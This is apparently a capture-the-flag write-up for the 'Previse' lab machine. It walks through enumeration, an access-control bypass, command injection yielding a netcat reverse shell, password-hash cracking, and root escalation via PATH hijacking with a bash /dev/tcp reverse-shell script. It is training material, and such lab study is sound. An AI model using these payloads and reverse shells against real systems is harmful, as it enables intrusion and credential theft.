## Default Information
IP address : 10.10.11.104\
Operating System : Linux

## Enumeration
Lets start with running a network scan on the IP address using ```NMAP``` to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
* sV : service detecttion
* sC : Run default nmap scripts
* A : Identify OS
* -p- : Scan all ports 
```code
sudo nmap -sC -sV -A -p- -T4 10.129.214.218 -vv 
```
From the output of ```NMAP```, we can identify the following information about the open ports
| Port Number | Service | Version |
|-----|------------------|----------------------|
| 22	| SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80	| HTTP | Apache httpd 2.4.29 (Ubuntu) |


## Discovery
Visit http://10.129.214.218. Using ```Wapplyzer```, we discover the following information
```code
Web servers : Apache 2.4.29
Operating systems : Ubuntu
Programming languages : PHP
```
Knowing that the programming language used is ```PHP```, we will try to enumerate the directory for PHP files
```code
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://10.129.214.218 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php -o out.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.214.218
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/08/10 23:22:31 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 2801] [--> login.php]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 2224]
/files.php            (Status: 302) [Size: 4914] [--> login.php]
/header.php           (Status: 200) [Size: 980]
/nav.php              (Status: 200) [Size: 1248]
/footer.php           (Status: 200) [Size: 217]
/css                  (Status: 301) [Size: 314] [--> http://10.129.214.218/css/]
/status.php           (Status: 302) [Size: 2966] [--> login.php]
/js                   (Status: 301) [Size: 313] [--> http://10.129.214.218/js/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/logs.php             (Status: 302) [Size: 0] [--> login.php]
```
Navigate to http://10.129.214.218/nav.php, we are able to view a few hyperlinks. However, we notice that all of the links in this page redirect us to the ```login.php``` page. This tells us that we will first have to login before we can view the pages.
![Image of nav.php](https://github.com/joelczk/writeups/blob/main/HTB/Images/Previse/nav_php.PNG )

Next, we will intercept the request made to ```CREATE ACCOUNT``` on the ```nav.php``` page using Burp Suite.

The first request that we intercept is a ```GET``` request to the ```accounts.php``` page. For this request, we will just forward the request, but we will intercept the response to this request.
<img src = "https://github.com/joelczk/writeups/blob/main/HTB/Images/Previse/accounts_php.PNG" width = "1000">

The corresponding response to this ```GET /accounts.php``` request would be a redirection with a status code of 302. 

<img src = "https://github.com/joelczk/writeups/blob/main/HTB/Images/Previse/response_accounts_php.PNG" width = "1000">

However, we realise that if we change the status code of the response to ```200 OK```and forward the response, we will be able to redirect the page to ```accounts.php``` and create a new user.

![Create a new user](https://github.com/joelczk/writeups/blob/main/HTB/Images/Previse/create_user.PNG)

Afterwards, we will create a new user with the following credentials
```code
username: test1234
password: test1234
```
We will now login to the website with the created credentials, and we are able to find an interesting site ```files.php```, which allows us to download a ```SITEBACKUP.zip```. We will download the zip file and examine the files inside. 
```code
┌──(kali㉿kali)-[~/Desktop]
└─$ unzip siteBackup.zip -d sitebackup
Archive:  siteBackup.zip
  inflating: sitebackip/accounts.php  
  inflating: sitebackip/config.php   
  inflating: sitebackip/download.php  
  inflating: sitebackip/file_logs.php  
  inflating: sitebackip/files.php    
  inflating: sitebackip/footer.php   
  inflating: sitebackip/header.php   
  inflating: sitebackip/index.php    
  inflating: sitebackip/login.php    
  inflating: sitebackip/logout.php   
  inflating: sitebackip/logs.php     
  inflating: sitebackip/nav.php      
  inflating: sitebackip/status.php   
```
From the unzipped files, we were able to obtain the credentials of the SQL server used in the ```config.php``` file. However, at the moment, we are unable to access the SQL server as we would probably need to gain access to the internal server to access the SQL server. 
```code
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```
We have also found an interesting site ```file_logs.php``` that seems to be storing the log data. We will intercept this request and examine it in Burp Suite. 
![Request to obtain file logs](https://github.com/joelczk/writeups/blob/main/HTB/Images/Previse/file_log.PNG)
The payload for this request looks like it is vulnerable to command injection. We will create a POC for this exploit by creating a payload to send a ping command to our IP address, and we will use ```Wireshark``` to capture the requests and check for ```ping``` requests.
```code
delim=comma%7Cping%20-n%2021%2010.10.16.250%7C%7C%60ping%20-c%2021%2010.10.16.250%60%20%23%27%20%7Cping%20-n%2021%2010.10.16.250%7C%7C%60ping%20-c%2021%2010.10.16.250%60%20%23%5C%22%20%7Cping%20-n%2021%2010.10.16.250
```
The ```ping``` requests were captured by wireshark, which proved that the POC worked.
![Ping requests captured](https://github.com/joelczk/writeups/blob/main/HTB/Images/Previse/ping_requests.PNG)

Now all we have to do, is to create a reverse shell to connect to ```10.10.11.104```. The payload used is ```delim=comma%7Cnc%20-e%20%2Fbin%2Fsh%2010.10.16.250%203000``` and we will create a listening shell on the attacker machine. Afterwards, we will establish the shell.
```code
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 3000                                                       23 ⚙
listening on [any] 3000 ...
connect to [10.10.16.250] from (UNKNOWN) [10.10.11.104] 45240
python3 -c 'import pty; pty.spawn(\"/bin/bash\")'   
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@previse:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@previse:/var/www/html$ ls
ls
accounts.php                download.php       footer.php  logs.php
android-chrome-192x192.png  favicon-16x16.png  header.php  nav.php
android-chrome-512x512.png  favicon-32x32.png  index.php   site.webmanifest
apple-touch-icon.png        favicon.ico        js          status.php
config.php                  file_logs.php      login.php
css                         files.php          logout.php

```
Recall that we have obtained the SQL credentials, we will now try to login to the SQL server using the credentials. 
```code
www-data@previse:/var/www/html$ mysql -u root -p
mysql -u root -p
Enter password: mySQL_p@ssw0rd!:)

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```
Next, we will explore the SQL server to find for sensitive information. Using the ```previse``` database and the ```accounts``` table, we are able to find the hashed password to another user ```m4lwhere```
```code
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use previse;
use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql> select * from accounts;
select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | test1234 | $1$🧂llol$ViKHakYTr5z3ijwpwu4Ac. | 2021-08-13 07:55:12 |
+----+----------+------------------------------------+---------------------+
2 rows in set (0.00 sec)

mysql>
```

Now, we have obtained the hashed password to the user, we will save the hashed password to a file. For my case, I saved it to a file named ```password``` Afterwards, we will use ```John the Ripper``` to crack the hashed password. (NOTE: This might take some time!)
* --wordlist : Defines the password list you are going to use for a dictionary attack
* -format : Format of the hashed password
```code
┌──(kali㉿kali)-[~/Desktop]
└─$ john -format=md5crypt-long --wordlist=/home/kali/Desktop/rockyou.txt password
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovecody112235! (?)
1g 0:00:05:07 DONE (2021-08-13 07:27) 0.003252g/s 24108p/s 24108c/s 24108C/s ilovecodyb..ilovecody*
Use the "--show" option to display all of the cracked passwords reliably
Session completed
┌──(kali㉿kali)-[~/Desktop]
└─$ john --show password                                                 6 ⚙
?:ilovecody112235!

1 password hash cracked, 0 left

```
## Obtaining user flag
Using the cracked credentials, we will SSH into the server and obtain the user flag
```code
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh m4lwhere@10.10.11.104                                            6 ⚙
The authenticity of host '10.10.11.104 (10.10.11.104)' can't be established.
ECDSA key fingerprint is SHA256:rr7ooHUgwdLomHhLfZXMaTHltfiWVR7FJAe2R7Yp5LQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.104' (ECDSA) to the list of known hosts.
m4lwhere@10.10.11.104's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Aug 13 11:42:46 UTC 2021

  System load:  0.0               Processes:           183
  Usage of /:   49.2% of 4.85GB   Users logged in:     0
  Memory usage: 21%               IP address for eth0: 10.10.11.104
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5
m4lwhere@previse:~$ cat user.txt
<Redacted user flag>
m4lwhere@previse:~$  
```

## Obtaining root flag
First, we will try to find the programs with root privileges and we discovered that ```/opt/scripts/access_backup.sh``` can be executed with root privileges.
```code
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```
To escalate our privilege to root privileges, we will have to do some path injection. We would have to first a gzip file in our ```/tmp``` directory that will spawn a reverse shell. The reason why we write to the ```/tmp``` directory is because this directory is the only dierctory where we have permission to write to.
```code
m4lwhere@previse:/$ ls -la
total 100
drwxr-xr-x  24 root root  4096 Jul 27 15:04 .
drwxr-xr-x  24 root root  4096 Jul 27 15:04 ..
drwxr-xr-x   2 root root  4096 Jul 27 14:41 bin
drwxr-xr-x   4 root root  4096 Jul 27 15:04 boot
drwxr-xr-x   2 root root  4096 May 25 13:48 cdrom
drwxr-xr-x  19 root root  3880 Aug 13 07:44 dev
drwxr-xr-x  97 root root  4096 Jul 27 14:43 etc
drwxr-xr-x   3 root root  4096 May 25 14:59 home
lrwxrwxrwx   1 root root    34 Jul 27 14:42 initrd.img -> boot/initrd.img-4.15.0-151-generic
lrwxrwxrwx   1 root root    34 Jul 27 15:04 initrd.img.old -> boot/initrd.img-4.15.0-151-generic
drwxr-xr-x  21 root root  4096 Jul 26 18:41 lib
drwxr-xr-x   2 root root  4096 May 27 21:50 lib64
drwx------   2 root root 16384 May 25 13:47 lost+found
drwxr-xr-x   2 root root  4096 Aug  6  2020 media
drwxr-xr-x   2 root root  4096 Aug  6  2020 mnt
drwxr-xr-x   3 root root  4096 Jul 26 18:41 opt
dr-xr-xr-x 196 root root     0 Aug 13 07:44 proc
drwx------   6 root root  4096 Jul 28 09:11 root
drwxr-xr-x  27 root root   880 Aug 13 11:42 run
drwxr-xr-x   2 root root 12288 Jul 27 14:41 sbin
drwxr-xr-x   2 root root  4096 May 25 14:59 snap
drwxr-xr-x   2 root root  4096 Aug  6  2020 srv
dr-xr-xr-x  13 root root     0 Aug 13 07:44 sys
drwxrwxrwt  11 root root  4096 Aug 13 12:19 tmp
drwxr-xr-x  11 root root  4096 Jul 16 19:17 usr
drwxr-xr-x  14 root root  4096 Jul 26 18:41 var
lrwxrwxrwx   1 root root    31 Jul 27 14:42 vmlinuz -> boot/vmlinuz-4.15.0-151-generic
lrwxrwxrwx   1 root root    31 Jul 27 15:04 vmlinuz.old -> boot/vmlinuz-4.15.0-151-generic
m4lwhere@previse:/$ 
```
The payload that we will be using for reverse shell is:
```code
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.250/3000 0>&1
```
Afterwards, we will have to grant permissions to the ```gzip``` file and modify the ```$PATH``` environment variables so that the malicious script can be executed. Lastly, we will have to execute the ```/opt/scripts/access_backup.sh``` script to execute the reverse shell. 
```code
m4lwhere@previse:~$ cd /tmp
m4lwhere@previse:/tmp$ nano gzip
m4lwhere@previse:/tmp$ chmod 777 gzip
m4lwhere@previse:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:/tmp$ export PATH=$(pwd):$PATH
m4lwhere@previse:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh
```
We will receive the connection on the attacker's machine and we will be able to obtain the system flag
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 3000                                                       24 ⚙
listening on [any] 3000 ...
connect to [10.10.16.250] from (UNKNOWN) [10.10.11.104] 47604
root@previse:/tmp# cd /root
cd /root
root@previse:/root# cat root.txt
cat root.txt
<Redacted root flag>
root@previse:/root# 
```

